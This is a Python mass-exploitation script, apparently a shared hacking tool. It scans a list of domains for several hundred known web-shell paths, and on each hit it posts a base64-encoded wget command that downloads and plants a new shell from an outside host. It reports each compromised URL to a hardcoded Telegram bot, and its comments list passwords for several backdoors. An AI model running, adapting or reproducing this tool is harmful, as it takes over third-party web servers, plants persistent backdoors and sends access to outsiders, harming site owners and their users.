import base64
import os 
import platform, subprocess, hashlib
import string
import random
import time

try:
    import requests #callmodule
    import colorama #callmodule
except:
    os.system('pip install requests') #installmodule
    os.system('pip install colorama') #installmodule

import requests
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor

try:
    os.mkdir('Result') #createfolder
except:
    pass

s = requests.Session()

uagent = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36'} #useragent

os.system('cls' if os.name == 'nt' else 'clear') #clearterminal

init()
merah = Fore.RED #color
hijau = Fore.GREEN #color
cyan = Fore.CYAN #color
kuning = Fore.YELLOW #color
reset = Fore.RESET #color
sysinfo = platform.system() + platform.release() + ' - ' + platform.platform() #deviceinfo

lista = ["1337.php","user.php",".dha.php","logs.php","wxo.php","amigo.php","-.php",".yoi.php","wp-info.php","wp-contentt.php","i3wfj.php","5fesj.php","s46v1.php","djfksr4.php","p7m94.php","we1y8.php","wxo.php","s46v1.php","jdimzmtaas.php","wp-content/iu.php","ccx/th3_err0r.php","ccx/index.php","cgi-bin/ffAA531.php","cgi-bin/991176.php","991176.php","up-kon.php","codeboy1877_up.php","wp-content/codeboy1877_up.php","hehe.php","post-data.php","wp-admin/codeboy1877_up.php","batm.php","wp-includes/codeboy1877_up.php","w0.php","webr00t.php","finca.php","qibozpiuqx.php","wp-content/finca.php","rg3v6.php","qly7i.php","cjaWY8Kf7Ci.php","wp-admin/ysp6c.php","soz.php","wp-admin/ysf87.php","wp-admin/ugeaz.php","wp-admin/nd8z1.php","wp-content/mny4z.php","wp-admin/mdsa9.php","wp-admin/lkf65.php","wp-admin/jensq.php","UNZipeRpoe.php","wp-admin/UNZipeRpoe.php","wp-admin/zphxi.php","wp-content/Free-fixed.php","wp-content/local.php","shell20211028.php","wp-content/ave.php","wp-content/xx.php","wp-admin-configs.php","ys16l.php","wp-content/Foxs1sx.php","Foxs1sx.php","uy7sw.php","75888592_err0r.php","syhrnvhpze.php","wp-admin/hb81i.php","wp-admin/zgpsy.php","wp-admin/Anonime-shell.php","wp-admin/wso32.php","wp-content/1788821455_error_log.php","wp-content/export.php","1788821455_error_log.php","cyb3r-sh3ll.php","fc11.php","wp-admin/oTm4n3x.php","oTm4n3x.php","assets/js/ice.php","img/ice.php","js/ice.php","wp-admin/ycxlu.php","fonts/ice.php","DKIZ.php?DKIZ","wp-content/ice.php","wp-admin/ice.php","fmb97.php","shl.php","pi.php","wp-admin/lx.php","wp-includes/assets/lx.php","wp-content/plugins/tusupugnpr/up.php?php=anonymousfox.is/_@files/php/up.txt","wp-admin/9h7zj.php","f6qxl.php","wp-signup.php?Fox=sQFLZ","angyw.php","wp-admin/57yke.php","gxsyuzkutr.php","3x.php","qb9sl.php","hewsioaypm.php","mailer.php","maileraso.php","dsdfklsjroden.php","_.php","wpse.php","Fresh.php","fkbqn.php","2.php","c9ny3.php","5.php","cakt.php","ab.php","wp-content/ak.php","wp-snapshots/ss.php","wp-content/alpa.php","wp_wrong_datlib.php","uploads/up.php","vekizcjxrc.php","wp-content/shell20211028.php","wp-sid.php","ALFA_DATA/wp-2019.php","defaul1.php","DownloadApp/wp-2019.php","Logo/wp-2019.php","takeout.php","tmpurufu.php","images/vuln.php","admin.php","media-admin.php","wp-content/upload.php","","xleet-shell.php","vse.php","shadowx.php","romfc.php","0byt3m1n1.php","wp-admin/alfav41.php","alfav41.php","wp-admin/zat2.php","zat2.php","wp-admin/webr00tv3.php","webr00tv3.php","wp-admin/romfc.php","ALFA_DATA/alfacgiapi/shellgo.php","deleteme.chajbbh2.php","ALFA_DATA/alfacgiapi/fox.php","FoxSH-3izfw/fox.sh","lock360.php","ffAA531.php","root.php","wp-site.php","homepage-index.php","wp-comments-post.php","reset.php","wp_logx.php","gank.php.PhP","mst.php","wp_wrong_datlib.php","indeeex.php","FoxWSO-full.php","w3llstore.php","wp-content/zfox.php","tmp/plupload/vuln.phP","pop.php","wp_wrong_datlib.php","wp-plugins.php","system_log.php","accesson.php","media-admin.php","gank.php.PhP","octeesfes.php","moduless.php","lok.php","inc.class.3index.php","inc.class.wp-plugins.php","wp-l0gin.php","1index.php","123.php","ot.php","masshp.php","pl1gn.php","wp-2019.php","xml.php","/wp-content/ninja.php","wp-content/a.php","ninja.php","radio.php","23.php","codeboy1877x.php","wp-content/think.php","sts.php","1877x.php","wp-content/plugins/upspy/con.php","wp-content/uploads/F0x.php","wp-includes/css/F0x.php","wp-includes/css/F0x.ph","wp-content/plugins/html404/xccc.php","wp-content/plugins/upspy/up.php","wp-content/5.php","wp-content/plugins/html404/wso25.php","wp-content/plugins/html404/xccc.php","wp-content/plugins/upspy/con.php#ubh@ubh","wp-content/plugins/upspy/sllolx.php","new-index.php","wp-content/plugins/css-ready/file.php","wp-content/plugins/css-ready-sel/file.php","sindex.php","wp-includes/css/modules.php","old-index.php","baindex.php","wikindex.php","ext15.php","Marvins.php","XxX.php","wp-admin/shapes.php","wp-content/plugins/upspy/index.php","wp-content/plugins/ubh/index.php","wp-content/plugins/vwcleanerplugin/bump.php?cache","wp-content/themes/gaukingo/db.php","wp-content/plugins/xichang/x.php?xi","wp-content/plugins/wp-db-ajax-made/wp-ajax.php","wp-content/plugins/html404/index.html","small.php","wp-content/uploads/small.php","wsanon.php","wp-content/small.php","wp-content/mode.php","doc.php","wp-content/plugins/three-column-screen-layout/db.php","indo.php","beence.php","indosec.php","archives.php","po8sa.php","thesmartestx.php","zcanp.php","burjuva.aspx","content.php","pvt.php","shell20211028.php","cgi-bin/wp-2019.php","crypted.php","h0110w4y.php","alf.php","55.php","vesiw.php","w.php","class-wp-widget-archives.php","wp-db.php","site_islemleri.php","1.php","Chitoge.php","lollers.php","0x1999 Private Shell (0x Shell).php","CyberNetic v2 (BANGLADESH CYBER ARMY) Shell. php","tl.phP","ccaef.php","/wp-includes/lx.php","/wp-content/ice.php","/wp-content/lx.php","lx.php","useri.php","tonant.php","wp.plug.PHp","css.PHp","f0x.php","1s2c4.php","config.bak.php","176.php","bypass403.php","css.php","zudjr.php","ra due ayang.php","2.php","3index.php","529.php","about.php","snowwins.php","uzgnsomdco.php","adminer.php","allahnaber.php","AK-74.php","alfa3.php","wp-admin/ALFA_DATA/alfacgiapi/perl.alfa","alfacgiapi/perl.alfa","/ALFA_DATA/alfacgiapi/alfa.php","/ALFA_DATA/alfacgiapi/c99.php","/ALFA_DATA/alfacgiapi/fw.php","/ALFA_DATA/alfacgiapi/mini.php","/ALFA_DATA/alfacgiapi/perl.alfa","ALFA_DATA/alfacgiapi/perl.alfa","/ALFA_DATA/alfacgiapi/r57.php","/ALFA_DATA/alfacgiapi/uploader.php","/ALFA_DATA/alfacgiapi/ups.php","alfaindex.php","alfa.php",".alf.php","b374k.php","bb.php","bypass.php","c99.php","cmd.php","css/ALFA_DATA/alfacgiapi/perl.alfa","cw.php","date.php","files/ALFA_DATA/alfacgiapi/perl.alfa","fw.php","haxor.php","icomsium.php","ico.php","images/ALFA_DATA/alfacgiapi/perl.alfa","indoxploit.php","leaf.php","marijuana.php","mass.php","mini.php","priv8.php","pws.php","r57.php","robots.php","shell.aspx","shell.php","small.php","snd.php","uploader.php","ups.php","wp-admin/alfacgiapi/perl.alfa","wp-admin/ALFA_DATA/alfacgiapi/perl.alfa","wp-class.php","wp-content/alfacgiapi/perl.alfa","wp-content/ALFA_DATA/alfacgiapi/perl.alfa","wp-content/batm.php","wp-content/masshp.php","wp-content/alfa.php","wp-content/fw.php","wp-content/plugins/cekidot/alf.php","wp-includes/alfacgiapi/perl.alfa","wp-includes/ALFA_DATA/alfacgiapi/perl.alfa","wso1.php","wso2.8.5.php","wso.php","ww.php","www.php","mininew.php","xleet.php"] #pathlist


# 23.php = AnonymousFox
# Ninja.php = IndexAttacker
# Mo2aaPriv.php = Mo2a0123
# wp_logx.php = 
# ffAA531.php = root
# wp_wrong_datlib.php = stusa
# wpse.php = leksak98@
# _.php = root
# mailer.php = kpxwbYBP4hQK
# wp-admin-configs.php = root
# wp-contentt.php = asdsdggenu
# wp-content/5.php = kontolgaceng
def sendme(message):
    apibot = "https://api.telegram.org/bot5189815562:AAGJx5wR-DxvsHveJBIqC3WNki88YLrQvaA/sendMessage?chat_id=1374161588&text="+message
    requests.get(apibot)

def exploit(domain):
    status = 0
    try:
        for i in lista:
            if domain.startswith("http://"):
                domain = domain.replace("http://", "")
            elif domain.startswith("https://"):
                domain = domain.replace("https://", "")
            rq = s.get('http://' + domain + '/' +i, headers=uagent)
            if rq.status_code == 200:
                waf = (''.join(random.choices(string.ascii_letters, k=5)))
                data = {'cmd':base64.b64encode(f'echo "success upload shell" && wget https://ups.zerodayforum.workers.dev/0:/shell.txt -O {waf}.php'.encode())}
                ww = s.post('http://' + domain + '/' +i, headers=uagent, data=data).text
                if 'Owner/Group' in rq.text:
                    print(f'[{cyan}+{reset}] http:// ' + domain + '/' + i + f' [ {hijau}FOUND SHELL{reset} ]')
                    sendme('http://' + domain+'/' + i)
                    with open('Result/Shell-Finder.txt', 'a+') as f:
                        f.write('http://' + domain+'/' + i + "\n")
                if "success upload shell" in ww:
                    with open('Result/PerlRCE.txt', 'a+') as f:
                        f.write('http://' + domain + '/' + i +  "\n")
                    tes = i.split('/')
                    tes[-1] = waf+'.php'
                    testes = s.get('http://' + domain + '/' + '/'.join(tes), headers=uagent).text
                    upshell = 0
                    if 'Owner/Group' in testes:
                        upshell = 1
                        shellpath = 'http://' + domain + '/' + '/'.join(tes)
                        sendme(shellpath)
                        with open('Result/Shells-PerlRCE.txt', 'a+') as f:
                            f.write('http://' + domain + '/' + '/'.join(tes) + "\n")
                    status = 1
                    break

        if status == 0:
            print(f'[{cyan}+{reset}] http://' + domain + f' [ {merah}Not Found{reset} ]')
        else:
            print(f'[{cyan}+{reset}] http://' + domain + f' [ {hijau}Found Perl ALFA{reset} ]')
            if upshell == 1:
                print(f'[{cyan}+{reset}] ' + shellpath + f' [ {hijau}Upload Success{reset} ]')

    except:
        print(f'[{cyan}+{reset}] http://' + domain + f' [ {merah}Unknown Host{reset} ]')       

banner = f"""
{reset} \033[1;34mDevice: {sysinfo} \033[1;34m

                                \033[1;34m██████╗ ██████╗  █████╗ ██╗   ██╗\033[1;34m
                               \033[1;34m██╔═████╗██╔══██╗██╔══██╗╚██╗ ██╔╝\033[1;34m
                               \033[1;34m██║██╔██║██║  ██║███████║ ╚████╔╝\033[1;34m 
                               \033[1;34m████╔╝██║██║  ██║██╔══██║  ╚██╔╝\033[1;34m  
                               \033[1;34m╚██████╔╝██████╔╝██║  ██║   ██║\033[1;34m   
                                \033[1;34m╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝\033[1;34m 

                        \033[1;34m SERVER RSF V2.0 By @ph03n1x69 & @BIBIL_0DAY \033[1;34m                                                    
"""

def computeMD5hash(my_string):
    m = hashlib.md5()
    m.update(my_string.encode('utf-8'))
    return m.hexdigest()

if 'nt' in os.name:
    a = str(subprocess.check_output('wmic csproduct get uuid')).split('\r\n')[0].strip('\r').strip()
else:
    with open("/etc/machine-id") as fd: a = fd.read()



if __name__ == '__main__':
    data = "asd" # requests.get('https://pastebin.com/raw/Txgk3FWs', timeout=10)
    a = "asd" # computeMD5hash(a)
    if a in data:
        try:
            print(banner)
            site = input('[?] Domain List > ') #domainlist
            thrd = input('[?] Thread > ') #thread
            perline = open(site,'r').read().splitlines()
            print('')
            with ThreadPoolExecutor(max_workers=int(thrd)) as e:
                [e.submit(exploit, i) for i in perline]
        except KeyboardInterrupt:
            print(f'\n\n{merah}[!] {reset}CTRL + C DETECT {merah}[!]')
            exit()
        except:
            print(f'{merah}[!] {reset}INCORRECT {merah}[!]')

    else:
        print('Your Key wasn\'t found on the server. Please Contact Author')
        print('Your key > ' + str(a))
        print('Send the key to Author\'s Discord @BIBIL_0DAY & @ph03n1x69 | https://discord.gg/rkkqTzGFun')